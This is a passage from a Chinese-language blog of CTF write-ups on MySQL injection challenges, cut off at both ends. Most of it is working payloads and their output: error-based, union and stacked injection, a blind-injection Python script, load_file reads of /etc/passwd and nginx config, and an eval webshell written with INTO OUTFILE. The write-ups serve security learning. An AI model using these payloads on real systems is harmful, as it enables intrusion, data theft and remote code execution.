<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;and(select extractvalue(1,concat(&#x27;~&#x27;,(select group_concat(column_name) from information_schema.columns where table_name=&quot;test_tb&quot; and table_schema=&#x27;test_db&#x27;))))#</span><br></pre></td></tr></table></figure>
<p>flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;and(select extractvalue(1,concat(&#x27;~&#x27;,(select substr((select flag from test_tb), 1 , 31)))))#</span><br><span class="line">-1&#x27;and(select extractvalue(1,concat(&#x27;~&#x27;,(select substr((select flag from test_tb), 31 , 60)))))#</span><br></pre></td></tr></table></figure>
<p>这里用union select也是可以的<br>我展示一下用法，具体思路除了一点点函数不同其他基本和常规注入是一样的<br>爆库：XPATH syntax error: ‘~test_db’<br>这里也可以爆一下所有的数据库名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;union select(select extractvalue(1,concat(&#x27;~&#x27;,(select database()))))#</span><br></pre></td></tr></table></figure>
<p>就是将and改为union select就可以的<br>还有就是这里的substr也可以换成mid的</p>
<p>注意一下这个的格式<br>还可以这个格式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; and 1=extractvalue(1,concat(0x7e,(select group_concat(id,‘~’,flag) from test_tb)))#</span><br></pre></td></tr></table></figure>
<p>还可以用另外一个函数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; order by 4--+#爆字段</span><br><span class="line">1&#x27; and updatexml(1,concat(0x7e,database(),0x7e),3)--+#爆库</span><br><span class="line">test_db</span><br><span class="line">1&#x27; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;test_db&#x27;,0x7e limit 0,1),3)--+#爆表</span><br><span class="line">1&#x27; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;test_tb&#x27;,0x7e limit 0,1),3)--+#爆列</span><br><span class="line">1&#x27; and updatexml(1,concat(0x7e,(select flag from test_tb,0x7e limit 0,1),3)--+#提取flag</span><br><span class="line">#用mid或reverse函数都可以提取完整flag</span><br></pre></td></tr></table></figure>
<p>上面是人家的wp，要稍微做一些修改</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; and updatexml(1,concat(0x7e,database(),0x7e),3)#</span><br></pre></td></tr></table></figure>
<p>这个就爆库成功了</p>
<h1 id="LitCTF-2023-这是什么？SQL-！注一下-！"><a href="#LitCTF-2023-这是什么？SQL-！注一下-！" class="headerlink" title="[LitCTF 2023]这是什么？SQL ！注一下 ！"></a>[LitCTF 2023]这是什么？SQL ！注一下 ！</h1><p>1分<br>SQL注入布尔盲注时间盲注<br>题目描述</p>
<p>为了安全起见多带了几个套罢了o(&#x2F;&#x2F;&#x2F;&#x2F;▽&#x2F;&#x2F;&#x2F;&#x2F;)q<br>出题人 探姬<br>就是闭合符多了几个，flag放在其他的数据库里，把所有数据库都爆出来就可以了<br>但是我还是要手动注入一下，还有就是wp里给出了其他的解法，写入木马的，确实值得学习一下<br>我们可以get传参，先输入一个1，2来试试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT username,password FROM users WHERE id = ((((((1))))))</span><br></pre></td></tr></table></figure>
<p>这里知道它的闭合符号方面的问题</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1))))))group by 2%23</span><br></pre></td></tr></table></figure>
<p>2有回显，3没有回显</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1))))))union select 1,database()%23</span><br></pre></td></tr></table></figure>
<p>回显：ctf<br>这个就用到了我们之前也强调过的，可能flag不在当前的数据库里面，需要我们先找一下所有的数据库</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1))))))union select 1,group_concat(schema_name) from information_schema.schemata%23</span><br></pre></td></tr></table></figure>
<p>这样就回显了所有的数据库的名称：information_schema,mysql,ctftraining,performance_schema,test,ctf<br>爆表</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1))))))union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;ctftraining&#x27;%23</span><br></pre></td></tr></table></figure>
<p>回显： flag,news,users<br>得到两个表<br>就两列，所有爆列</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1))))))union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27;%23</span><br></pre></td></tr></table></figure>
<p>回显：flag<br>拿到flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1))))))union select 1,group_concat(flag) from flag%23</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1)))))) union select flag,2 from flag where table_schema=&#x27;ctftraining&#x27;%23</span><br></pre></td></tr></table></figure>
<p>这里拿不到flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">经过测试，发现了table_schema只是内置库的字段，我们这里指定数据库查询应该用：库名.表名的形式</span><br><span class="line">?id=-1)))))) union select flag,2 from ctftraining.flag%23</span><br></pre></td></tr></table></figure>
<p>来拿到flag<br>这里还有一种getshell的方式，这个就先看看<br>mysql的getshell的条件和原理</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">条件：</span><br><span class="line"> root权限</span><br><span class="line"> 知道网站根目录绝对路径</span><br><span class="line"> secure_file_priv为空或指定目录（@@secure_file_priv参数可以其值）</span><br><span class="line"> gpc关闭</span><br><span class="line">原理：</span><br><span class="line"> 写入webshell，通过参数执行系统命令，结束后删除webshell</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">附：sqlserver getshell条件和原理</span><br><span class="line"> 条件：</span><br><span class="line">  支持外连</span><br><span class="line">  有sa权限</span><br><span class="line"> 原理：</span><br><span class="line">  开启xp_cmd扩展执行系统命令</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>读写文件：?id&#x3D;-1)))))) union select load_file(‘&#x2F;etc&#x2F;passwd’),2%23<br>读取nginx配置文件，寻找网站根目录：<br>?id&#x3D;-1)))))) union select load_file(‘&#x2F;etc&#x2F;nginx&#x2F;nginx.conf’),2%23<br>Array ( [0] &#x3D;&gt; Array ( [username] &#x3D;&gt; daemon off; worker_processes auto; error_log &#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log warn; events { worker_connections 1024; } http { include &#x2F;etc&#x2F;nginx&#x2F;mime.types; default_type application&#x2F;octet-stream; sendfile on; keepalive_timeout 65; server { listen 80; server_name localhost; root &#x2F;var&#x2F;www&#x2F;html; index index.php; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; location &#x2F; { try_files $uri $uri&#x2F; &#x2F;index.php?$args; } location ~ .php$ { try_files $uri &#x3D;404; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; include fastcgi_params; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; } } } [password] &#x3D;&gt; 2 ) )<br>读取首页<br>?id&#x3D;-1)))))) union select load_file(‘&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php’),2%23</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; Array</span><br><span class="line">        (</span><br><span class="line">            [username] =&gt; &lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">  include &quot;connect.php&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0, shrink-to-fit=no&quot;&gt;</span><br><span class="line">    &lt;title&gt;狠狠的注入涅~&lt;/title&gt;</span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; href=&quot;assets/bootstrap/css/bootstrap.min.css&quot;&gt;</span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot;</span><br><span class="line">        href=&quot;https://fonts.googleapis.com/css?family=Lato:300,400,700,300italic,400italic,700italic&amp;amp;display=swap&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;header class=&quot;text-center text-white masthead&quot;</span><br><span class="line">        style=&quot;background:url(&#x27;https://www.dmoe.cc/random.php&#x27;)no-repeat center center;background-size:cover;&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;overlay&quot;&gt;&lt;/div&gt;</span><br><span class="line">        &lt;div class=&quot;container&quot;&gt;</span><br><span class="line">            &lt;div class=&quot;row&quot;&gt;</span><br><span class="line">                &lt;div class=&quot;col-xl-9 mx-auto position-relative&quot;&gt;</span><br><span class="line">                    &lt;h1 class=&quot;mb-5&quot;&gt;Search what you want to search&lt;/h1&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">                &lt;div class=&quot;col-md-10 col-lg-8 col-xl-7 mx-auto position-relative&quot;&gt;</span><br><span class="line">                    &lt;form method=&quot;get&quot; action=&quot;&quot;&gt;</span><br><span class="line">                        &lt;div class=&quot;row&quot;&gt;</span><br><span class="line">                            &lt;div class=&quot;col-12 col-md-9 mb-2 mb-md-0&quot;&gt;</span><br><span class="line">                                &lt;input class=&quot;form-control form-control-lg&quot; type=&quot;text&quot; name=&quot;id&quot;</span><br><span class="line">                                    placeholder=&quot;Enter your id to start&quot;&gt;</span><br><span class="line">                            &lt;/div&gt;</span><br><span class="line">                            &lt;div class=&quot;col-12 col-md-3&quot;&gt;</span><br><span class="line">                                &lt;button class=&quot;btn btn-primary btn-lg&quot; type=&quot;submit&quot;&gt;姨妈大！&lt;/button&gt;</span><br><span class="line">                            &lt;/div&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                    &lt;/form&gt;</span><br><span class="line"></span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/header&gt;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;section class=&quot;text-center bg-light features-icons&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;container&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;row&quot;&gt;</span><br><span class="line">            &lt;div class=&quot;col-md-6&quot;&gt; </span><br><span class="line">                &lt;h5&gt;Key Source&lt;/h5&gt;</span><br><span class="line">                &lt;pre&gt;&lt;?php highlight_file(source) ?&gt;&lt;/pre&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;div class=&quot;col-md-6&quot;&gt; </span><br><span class="line">                &lt;?php</span><br><span class="line">                </span><br><span class="line">                $sql = &quot;SELECT username,password FROM users WHERE id = &quot;.&#x27;((((((&#x27;.$_GET[&quot;id&quot;].&#x27;))))))&#x27;;</span><br><span class="line">                echo &quot;&lt;h5&gt;Executed Operations:&lt;/h5&gt;&quot;</span><br><span class="line">                    .$sql</span><br><span class="line">                    .&quot;&lt;br&gt;&lt;br&gt;&quot;;</span><br><span class="line">                $result = $conn-&gt;query($sql);</span><br><span class="line">                if ($result-&gt;num_rows &gt; 0) &#123;</span><br><span class="line">                        print_r(mysqli_fetch_all($result, MYSQLI_ASSOC));</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    echo &quot;0 results&quot;;</span><br><span class="line">                &#125;</span><br><span class="line">                ?&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/section&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &lt;section class=&quot;showcase&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;container-fluid p-0&quot;&gt;</span><br><span class="line">            &lt;div class=&quot;row g-0&quot;&gt;&lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/section&gt;</span><br><span class="line">    &lt;script src=&quot;assets/bootstrap/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            [password] =&gt; 2</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>写入php探针：<br>?id&#x3D;-1)))))) union select ‘<?php phpinfo();?>‘,2 into outfile ‘&#x2F;var&#x2F;www&#x2F;html&#x2F;info.php’%23<br><a target="_blank" rel="noopener" href="http://node6.anna.nssctf.cn:28413/info.php">http://node6.anna.nssctf.cn:28413/info.php</a><br>写入webshell<br>?id&#x3D;-1)))))) union select ‘<?php eval($_POST["cc"]);?>‘,2 into outfile ‘&#x2F;var&#x2F;www&#x2F;html&#x2F;cc.php’%23<br>蚁剑连接：<a target="_blank" rel="noopener" href="http://node6.anna.nssctf.cn:28413/cc.php">http://node6.anna.nssctf.cn:28413/cc.php</a> 密码cc</p>
<h1 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h1><p>1分<br>堆叠注入关键字绕过SQL注入<br>题目暗示你了是sql注入，还有就是源码告诉你sqlmap是没有灵魂的，知道考察的方面<br>这里我们的1’;或者1’#的这个可以得到闭合符<br>因为要堆叠注入，所以我们就要用;<br>1’;show tables;<br>使用mysql的show命令可以查看数据库，表，字段等信息<br>这个可以爆库，也是第一次见这种情况</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(16) &quot;1919810931114514&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(5) &quot;words&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>有两个表<br>使用show命令来查看表中的字段，注意表名要用反引号包裹，payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#x27;;show columns from `1919810931114514`;</span><br></pre></td></tr></table></figure>
<p>words也可以用这个，查words也是用反引号<br>回显：<br>array(6) {<br>  [0]&#x3D;&gt;<br>  string(4) “flag”<br>  [1]&#x3D;&gt;<br>  string(12) “varchar(100)”<br>  [2]&#x3D;&gt;<br>  string(2) “NO”<br>  [3]&#x3D;&gt;<br>  string(0) “”<br>  [4]&#x3D;&gt;<br>  NULL<br>  [5]&#x3D;&gt;<br>  string(0) “”<br>}<br>后面的还可以再加一个–a,应该是起注释作用<br>使用handler查看表中的数据，需要注意的是，表名如果是数字，则需要用反引号包裹起来</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#x27;;handler `1919810931114514` open;handler `1919810931114514` read first; -- a</span><br></pre></td></tr></table></figure>
<p>handler语句不具有select语句的所有功能。他是mysql专用的语句，并没有包含到标准的sql语句中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">HANDLER tbl_name OPEN [ [AS] alias]</span><br><span class="line"></span><br><span class="line">HANDLER tbl_name READ index_name &#123; = | &lt;= | &gt;= | &lt; | &gt; &#125; (value1,value2,…)[ WHERE where_condition ] [LIMIT … ]</span><br><span class="line"></span><br><span class="line">HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125;[ WHERE where_condition ] [LIMIT … ]</span><br><span class="line"></span><br><span class="line">HANDLER tbl_name READ &#123; FIRST | NEXT &#125;[ WHERE where_condition ] [LIMIT … ]</span><br><span class="line"></span><br><span class="line">HANDLER tbl_name CLOSE</span><br><span class="line"></span><br><span class="line">handler users open as yunensec; #指定数据表进行载入并将返回句柄重命名</span><br><span class="line"></span><br><span class="line">handler yunensec read first; #读取指定表/句柄的首行数据</span><br><span class="line"></span><br><span class="line">handler yunensec read next; #读取指定表/句柄的下一行数据</span><br><span class="line"></span><br><span class="line">handler yunensec read next; #读取指定表/句柄的下一行数据</span><br><span class="line"></span><br><span class="line">…</span><br><span class="line"></span><br><span class="line">handler yunensec close; #关闭句柄</span><br><span class="line"></span><br><span class="line">1’;</span><br><span class="line">handler tablename open;</span><br><span class="line">handler tablename read first #</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>补充一下其他的做法，这道题还得是做一下相关的题目才可以慢慢熟悉一下<br>由show的作用可知，words表内就两个字段，一个叫id，一个叫data。</p>
<p>并且可以得知，该题作者在页面就查了这两个字段的内容，由于该题禁用select，因此我们可以用作者原本设定的查表函数来帮我们查我们想要查找的内容。因此我们对表进行改名：</p>
<p>用rename把words表改名为其他的表名，把 1919810931114514表的名字改为words，给words表添加新的列名id，将flag改名为data。</p>
<p>构造payload如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://4a74d507-bd81-4639-8579-82aebaf359cb.node4.buuoj.cn:81/?inject=1&#x27;; rename table words to word1; rename table `1919810931114514` to words;alter table words add id int unsigned not Null auto_increment primary key; alter table words change flag data varchar(100);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>补充一下alter</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//alter可以修改已知表的列</span><br><span class="line">alter table &quot;table_name&quot; add &quot;column_name&quot; type;//添加一个列</span><br><span class="line">alter table &quot;table_name&quot; drop &quot;column_name&quot; type;//删除一个列</span><br><span class="line">alter table &quot;table_name&quot; alter column &quot;column_name&quot; type;//改变列的数据类型</span><br><span class="line">alter table &quot;table_name&quot; change &quot;column1&quot; &quot;column2&quot; type;//改列名</span><br><span class="line">alter table &quot;table_name&quot; rename &quot;column1&quot; to &quot;column2&quot;;//改列名</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1 id="CISCN-2019华北Day2-Web1"><a href="#CISCN-2019华北Day2-Web1" class="headerlink" title="[CISCN 2019华北Day2]Web1"></a>[CISCN 2019华北Day2]Web1</h1><p>1分<br>布尔盲注SQL注入空格绕过<br>Ok呀，也是遇到一个大一些的比赛的盲注了<br>一进去</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">All You Want Is In Table &#x27;flag&#x27; and the column is &#x27;flag&#x27;</span><br><span class="line">Now, just give the id of passage</span><br></pre></td></tr></table></figure>
<p>这里是有些问题，返回的bool(false)不显示，但是刚才我记得显示的<br>不显示，需要查看网页源代码的话我们就打开Bp呗<br>我们测试1，回显正常<br>闭合符，1’返回布尔类型错误<br>1’#发现这个有waf<br>这里我们可以用字典来看看过滤了什么，为了思路更加的清晰，这里就按照wp给的参考一下，本地已实际跑了<br>经过一番测试，发现or、-、#、；、and、空格、updatexml、union等很多关键字都被过滤了<br>这就说明联合查询、报错注入以及堆叠注入都不能使用了<br>经过上述测试，也就说明就剩下时间盲注和布尔盲注可以尝试了<br>先测试时间盲注，我们这里的flag的第一个字符就是f，对应的ascii就是102</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=if((ascii(substr((select(flag)from(flag)),1,1))=102),sleep(3),1)</span><br></pre></td></tr></table></figure>
<p>输入错误的ascii码发现。上面的回显需要的时间是上面的两倍</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=if((ascii(substr((select(flag)from(flag)),1,1))=103),sleep(3),1)</span><br></pre></td></tr></table></figure>
<p>脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"> </span><br><span class="line">url = &#x27;http://d9cdff35-454b-4b10-adba-51f0130200ae.node5.buuoj.cn:81/index.php&#x27;</span><br><span class="line"> </span><br><span class="line">for i in range(1, 60):</span><br><span class="line">    for c in range(0, 127):</span><br><span class="line">        payload = &#x27;(ascii(substr((select(flag)from(flag)),&#x27; + str(i) + &#x27;,1))=&#x27; + str(c) + &#x27;)&#x27;</span><br><span class="line">        r = requests.post(url, data=&#123;&#x27;id&#x27;: payload&#125;)</span><br><span class="line">        time.sleep(0.005)</span><br><span class="line">        if &#x27;girlfriend&#x27; in str(r.content):</span><br><span class="line">            flag = chr(c)</span><br><span class="line">            print(flag, end=&#x27;&#x27;)</span><br><span class="line">            time.sleep(2)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
<p>这个就可以拿到flag</p>
<h1 id="第五空间-2021-yet-another-mysql-injection"><a href="#第五空间-2021-yet-another-mysql-injection" class="headerlink" title="[第五空间 2021]yet_another_mysql_injection"></a>[第五空间 2021]yet_another_mysql_injection</h1><p>1分<br>SQL注入quine注入布尔盲注<br>登陆进去<a target="_blank" rel="noopener" href="http://node4.anna.nssctf.cn:28213/index.php">http://node4.anna.nssctf.cn:28213/index.php</a><br>然后我们查看网页源代码，然后得知有?source<br>访问：<a target="_blank" rel="noopener" href="http://node4.anna.nssctf.cn:28213/?source">http://node4.anna.nssctf.cn:28213/?source</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">include_once(&quot;lib.php&quot;);</span><br><span class="line">function alertMes($mes,$url)&#123;</span><br><span class="line">    die(&quot;&lt;script&gt;alert(&#x27;&#123;$mes&#125;&#x27;);location.href=&#x27;&#123;$url&#125;&#x27;;&lt;/script&gt;&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function checkSql($s) &#123;</span><br><span class="line">    if(preg_match(&quot;/regexp|between|in|flag|=|&gt;|&lt;|and|\||right|left|reverse|update|extractvalue|floor|substr|&amp;|;|\\\$|0x|sleep|\ /i&quot;,$s))&#123;</span><br><span class="line">        alertMes(&#x27;hacker&#x27;, &#x27;index.php&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&#x27;username&#x27;]) &amp;&amp; $_POST[&#x27;username&#x27;] != &#x27;&#x27; &amp;&amp; isset($_POST[&#x27;password&#x27;]) &amp;&amp; $_POST[&#x27;password&#x27;] != &#x27;&#x27;) &#123;</span><br><span class="line">    $username=$_POST[&#x27;username&#x27;];</span><br><span class="line">    $password=$_POST[&#x27;password&#x27;];</span><br><span class="line">    if ($username !== &#x27;admin&#x27;) &#123;</span><br><span class="line">        alertMes(&#x27;only admin can login&#x27;, &#x27;index.php&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">    checkSql($password);</span><br><span class="line">    $sql=&quot;SELECT password FROM users WHERE username=&#x27;admin&#x27; and password=&#x27;$password&#x27;;&quot;;</span><br><span class="line">    $user_result=mysqli_query($con,$sql);</span><br><span class="line">    $row = mysqli_fetch_array($user_result);</span><br><span class="line">    if (!$row) &#123;</span><br><span class="line">        alertMes(&quot;something wrong&quot;,&#x27;index.php&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">    if ($row[&#x27;password&#x27;] === $password) &#123;</span><br><span class="line">        die($FLAG);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">    alertMes(&quot;wrong password&quot;,&#x27;index.php&#x27;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;source&#x27;]))&#123;</span><br><span class="line">  show_source(__FILE__);</span><br><span class="line">  die;</span><br><span class="line">&#125;</span><br><span 